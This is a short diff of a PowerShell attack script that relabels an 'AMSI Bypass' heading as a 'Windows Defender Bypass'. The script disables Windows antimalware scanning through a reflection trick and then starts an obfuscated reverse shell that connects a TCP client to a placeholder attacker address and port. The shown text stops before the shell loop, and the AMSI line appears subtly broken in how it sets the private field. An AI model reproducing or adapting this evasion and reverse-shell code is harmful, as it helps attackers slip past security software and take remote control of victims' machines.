@@ -1,9 +1,9 @@
-# AMSI Bypass
+# Windows Defender Bypass 
 $s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
 $s::amsiInitFailed = $true;
 
-# Obfuscated reverse shell
-$ip='YOUR_IP';$p=4444;
+# Obfuscated Reverse shell
+$ip='YOUR_IP';$p=L_PORT;
 $tc='System.Net.Sockets.TCPClient';$t=New-Object ($tc) ($ip,$p);
 $s=$t.GetStream();
 $buf=0..65535|%{0};
